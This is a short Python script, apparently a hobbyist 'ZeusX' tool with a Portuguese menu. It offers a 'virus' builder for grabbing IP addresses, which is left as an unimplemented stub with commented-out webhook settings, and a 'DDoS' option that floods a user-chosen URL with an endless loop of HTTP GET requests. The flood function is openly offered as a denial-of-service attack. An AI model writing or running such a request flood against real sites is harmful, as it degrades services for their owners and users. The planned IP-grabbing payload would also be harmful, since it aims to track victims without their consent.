import PyInstaller.__main__
import requests
import os
import colorama
from colorama import Fore as FORE
import time


colorama.init(autoreset=True)
print(f"""
{FORE.CYAN}███████╗███████╗██╗   ██╗███████{FORE.YELLOW}╗██╗  ██╗
{FORE.CYAN}╚══███╔╝██╔════╝██║   ██║██╔════╝{FORE.YELLOW}╚██╗██╔╝
{FORE.CYAN}  ███╔╝ █████╗  ██║   ██║███████╗{FORE.YELLOW} ╚███╔╝ 
{FORE.CYAN} ███╔╝  ██╔══╝  ██║   ██║╚════██║{FORE.YELLOW}██╔██╗ 
{FORE.CYAN}███████╗███████╗╚██████╔╝███████║{FORE.YELLOW}██╔╝ ██╗
{FORE.CYAN}╚══════╝╚══════╝ ╚═════╝ ╚══════╝{FORE.YELLOW}╚═╝  ╚═╝
{FORE.WHITE}                         
""", flush=True)
print(f'{FORE.BLUE}[1] {FORE.MAGENTA} - {FORE.YELLOW}Construir Virus (IP FETCHER){FORE.WHITE}')
print(f'{FORE.BLUE}[2] {FORE.MAGENTA} - {FORE.RED}Ataque DDOs{FORE.WHITE}')
print(f'{FORE.BLUE}[3] {FORE.MAGENTA} - {FORE.GREEN}Sair{FORE.WHITE}')
choice = input(f"{FORE.RED}$> ")
#settings = {
#    "webtoken": "",
#    "username": "XyzHook ᅳ IP Fetcher"
#}
#webtoken=settings['webtoken']
#username=settings['username']

    


fetches = 0
def ddos(site):
    global fetches
    try:
        while True:
            fetches += 1
            res = requests.get(site)
            status = res.status_code
            wait_time = 2
            print(f'Status: {status}, Fetches: {fetches}')
            if status == 429:
                time.sleep(wait_time)
    except Exception as e:
        print(f'Um erro ocorreu! {e}')

def check():
    if int(choice) == 1:
        print('Em breve.')
    elif int(choice) == 2:
        site = input("Insira o site alvo: ")
        ddos(site)
    elif int(choice) == 3:
        exit()
    else:
        print('Escolha invalida!')
check()
